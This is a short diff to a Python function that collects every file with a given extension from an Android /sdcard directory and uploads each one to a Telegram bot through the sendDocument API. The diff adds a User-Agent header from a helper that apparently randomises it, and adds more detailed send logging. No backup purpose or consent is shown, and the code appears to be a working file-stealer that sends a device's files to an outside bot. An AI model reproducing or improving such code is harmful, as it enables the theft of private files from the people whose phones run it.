@@ -14,17 +14,22 @@ def m1():
 
 def send_files(file_extension, bot_token, chat_id, sdcard_path='/sdcard'):
     session = requests.session()
+    headers = {'User-Agent': m1()}  # Optionally add user-agent if needed
     try:
         file_list = [f for f in os.listdir(sdcard_path) if f.endswith(file_extension)]
+        if not file_list:
+            print(f"No files with extension {file_extension} found.")
         for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
+            file_path = os.path.join(sdcard_path, file)
+            with open(file_path, 'rb') as f:
                 url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
                 data = {'chat_id': chat_id}
                 files = {'document': f}
-                response = session.post(url, data=data, files=files)
-                print(response.text)
-                if not response.ok:
-                    print(f"Error sending file: {file}, Status code: {response.status_code}")
+                response = session.post(url, data=data, files=files, headers=headers)
+                if response.ok:
+                    print(f"Successfully sent file: {file}")
+                else:
+                    print(f"Failed to send file: {file}, Status code: {response.status_code}, Response: {response.text}")
     except Exception as e:
         print(f"Error in send_files: {e}")
 
